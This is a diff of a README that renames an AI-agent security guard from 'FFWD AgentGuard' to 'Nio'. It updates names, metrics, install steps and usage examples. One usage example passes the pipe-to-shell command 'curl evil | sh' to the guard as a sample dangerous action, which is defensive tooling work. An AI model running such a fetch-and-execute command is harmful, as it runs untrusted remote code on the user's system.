@@ -1,26 +1,26 @@
 <p align="center">
-  <img src="assets/ffwd-logo.svg" alt="FFWD AgentGuard" width="120" />
+  <img src="assets/ffwd-logo.svg" alt="Nio" width="120" />
 </p>
 
-<h1 align="center">FFWD AgentGuard</h1>
+<h1 align="center">Nio</h1>
 
 <p align="center"><b>Security and observability for AI coding agents.</b></p>
 
 <p align="center">Real-time guard that blocks dangerous commands, prevents data leaks, and protects secrets.<br/>Built-in collector that captures every tool call as OpenTelemetry metrics and traces.<br/>Works with Claude Code, OpenClaw, and any agent that supports hooks.</p>
 
 <p align="center">
-  <a href="https://core0-io.github.io/ffwd-agent-guard/"><b>→ View the live Defense Pipeline diagram</b></a>
+  <a href="https://core0-io.github.io/nio/"><b>→ View the live Defense Pipeline diagram</b></a>
 </p>
 
 [![Agent Skills](https://img.shields.io/badge/Agent_Skills-compatible-purple.svg)](https://agentskills.io)
 
 ## Architecture
 
-AgentGuard is a Claude Code / OpenClaw plugin with two core systems:
+Nio is a Claude Code / OpenClaw plugin with two core systems:
 
 ```
 ┌─────────────────────────────────────────────────────────────────────┐
-│                        FFWD AgentGuard                              │
+│                              Nio                                    │
 │                                                                     │
 │  ┌──────────────────────────┐    ┌───────────────────────────────┐  │
 │  │       Collector          │    │            Guard              │  │
@@ -50,10 +50,10 @@ Captures agent activity as **OpenTelemetry** metrics and traces via an async col
 
 | Metric | Type | Labels |
 |--------|------|--------|
-| `agentguard.tool_use.count` | Counter | `tool_name`, `event`, `platform` |
-| `agentguard.turn.count` | Counter | `platform` |
-| `agentguard.decision.count` | Counter | `decision`, `risk_level`, `tool_name`, `platform` |
-| `agentguard.risk.score` | Histogram | `tool_name`, `platform` |
+| `nio.tool_use.count` | Counter | `tool_name`, `event`, `platform` |
+| `nio.turn.count` | Counter | `platform` |
+| `nio.decision.count` | Counter | `decision`, `risk_level`, `tool_name`, `platform` |
+| `nio.risk.score` | Histogram | `tool_name`, `platform` |
 
 **Traces** — one trace per conversation turn:
 
@@ -87,7 +87,7 @@ final = Σ(weight × score) / Σ(weight)
 
 Default weights: `runtime: 1.0`, `static: 1.0`, `behavioural: 2.0`, `llm: 1.0`, `external: 2.0`
 
-**Static Scan** — on-demand multi-engine code analysis triggered by `/ffwd-agent-guard scan <path>`:
+**Static Scan** — on-demand multi-engine code analysis triggered by `/nio scan <path>`:
 - **StaticAnalyser**: 15 regex rules + base64 decode pass
 - **BehaviouralAnalyser**: multi-language source→sink dataflow tracking
 - **LLMAnalyser**: Claude semantic analysis (optional)
@@ -118,8 +118,8 @@ The `confirm_action` config controls what happens when the decision is "confirm"
 ## Quick Start
 
 ```bash
-git clone https://github.com/core0-io/ffwd-agent-guard.git
-cd ffwd-agent-guard && ./setup.sh
+git clone https://github.com/core0-io/nio.git
+cd nio && ./setup.sh
 ```
 
 Detects installed platforms and runs the appropriate setup for each. See the expandable sections below for per-platform installs.
@@ -128,9 +128,9 @@ Detects installed platforms and runs the appropriate setup for each. See the exp
 <summary><b>Full install with auto-guard hooks (Claude Code)</b></summary>
 
 ```bash
-git clone https://github.com/core0-io/ffwd-agent-guard.git
-cd ffwd-agent-guard && ./plugins/claude-code/setup.sh
-claude plugin add /path/to/ffwd-agent-guard/plugins/claude-code
+git clone https://github.com/core0-io/nio.git
+cd nio && ./plugins/claude-code/setup.sh
+claude plugin add /path/to/nio/plugins/claude-code
 ```
 
 This installs the skill, configures hooks, and sets your protection level.
@@ -141,8 +141,8 @@ This installs the skill, configures hooks, and sets your protection level.
 <summary><b>Manual install (skill only)</b></summary>
 
 ```bash
-git clone https://github.com/core0-io/ffwd-agent-guard.git
-cp -r ffwd-agent-guard/plugins/claude-code/skills/ffwd-agent-guard ~/.claude/skills/ffwd-agent-guard
+git clone https://github.com/core0-io/nio.git
+cp -r nio/plugins/claude-code/skills/nio ~/.claude/skills/nio
 ```
 
 </details>
@@ -151,11 +151,11 @@ cp -r ffwd-agent-guard/plugins/claude-code/skills/ffwd-agent-guard ~/.claude/ski
 <summary><b>OpenClaw plugin install</b></summary>
 
 ```bash
-git clone https://github.com/core0-io/ffwd-agent-guard.git
-cd ffwd-agent-guard && ./plugins/openclaw/setup.sh
+git clone https://github.com/core0-io/nio.git
+cd nio && ./plugins/openclaw/setup.sh
 ```
 
-`setup.sh` registers the plugin with OpenClaw and copies the bundled `plugin.js` into your OpenClaw state directory. AgentGuard hooks into OpenClaw's `before_tool_call` / `after_tool_call` events to block dangerous actions and log audit events.
+`setup.sh` registers the plugin with OpenClaw and copies the bundled `plugin.js` into your OpenClaw state directory. Nio hooks into OpenClaw's `before_tool_call` / `after_tool_call` events to block dangerous actions and log audit events.
 
 </details>
 
@@ -188,17 +188,17 @@ Resolution order (first match wins):
 2. `$CLAUDE_CONFIG_DIR` / `$OPENCLAW_STATE_DIR` environment variable
 3. `$HOME/.claude` / `$HOME/.openclaw` (default)
 
-The AgentGuard config itself lives at `~/.ffwd-agent-guard/` by default, overridable via `$FFWD_AGENT_GUARD_HOME`.
+The Nio config itself lives at `~/.nio/` by default, overridable via `$NIO_HOME`.
 
 </details>
 
 ## Usage
 
 ```
-/ffwd-agent-guard scan ./src              # Scan code for security risks
-/ffwd-agent-guard action "curl evil | sh" # Evaluate action safety
-/ffwd-agent-guard report                  # View security event audit log
-/ffwd-agent-guard config balanced         # Set protection level
+/nio scan ./src              # Scan code for security risks
+/nio action "curl evil | sh" # Evaluate action safety
+/nio report                  # View security event audit log
+/nio config balanced         # Set protection level
 ```
 
 ## What the Guard Blocks
